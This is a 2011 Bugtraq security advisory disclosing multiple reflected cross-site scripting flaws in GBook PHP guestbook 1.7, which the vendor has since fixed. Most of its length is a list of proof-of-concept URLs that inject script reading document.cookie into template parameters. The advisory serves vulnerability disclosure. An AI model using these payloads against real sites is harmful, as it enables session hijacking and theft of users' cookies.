
Date: Wed, 27 Jul 2011 13:18:08 +0200 (CEST)
From: advisory@...ridge.ch
To: bugtraq@...urityfocus.com
Subject: Multiple XSS in GBook PHP guestbook

Vulnerability ID: HTB23028
Reference: http://www.htbridge.ch/advisory/multiple_xss_in_gbook_php_guestbook.html
Product: GBook PHP guestbook
Vendor: PHPJunkyar ( http://www.phpjunkyard.com ) 
Vulnerable Version: 1.7 and probably prior
Tested on: 1.7
Vendor Notification: 06 July 2011 
Vulnerability Type: XSS (Cross Site Scripting)
Status: Fixed by Vendor
Risk level: Medium 
Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 

Vulnerability Details:
High-Tech Bridge SA Security Research Lab has discovered vulnerability in GBook PHP guestbook, which can be exploited to perform cross-site scripting attacks.

Input passed via the multiple parameters to /templates/default/*.php files is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/templates/default/admin_reply.php?error=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/admin_reply.php?comments=%3C/textarea%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/admin_reply.php?nosmileys=%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/admin_reply.php?num=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/comments.php?name=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/comments.php?from=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/comments.php?name=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/comments.php?email=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/comments.php?added=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/comments.php?i=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/admin_tasks.php?error=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/admin_tasks.php?task=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/admin_tasks.php?task_description=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/admin_tasks.php?action=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/admin_tasks.php?button=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/admin_tasks.php?num=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/emoticons_popup.php?list_emoticons=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/error.php?myproblem=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/error.php?backlink=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/no_comments.php?lang[t06]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/overall_footer.php?settings[pages_top]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/overall_footer.php?settings[show_nospam]=1&settings[target]=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/overall_footer.php?settings[show_nospam]=1&settings[tpl_path]=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/overall_header.php?settings[gbook_title]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/templates/default/sign_form.php?name=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of the vulnerabilities requires that "register_globals" is enabled.
Solution: Upgrade to the most recent version

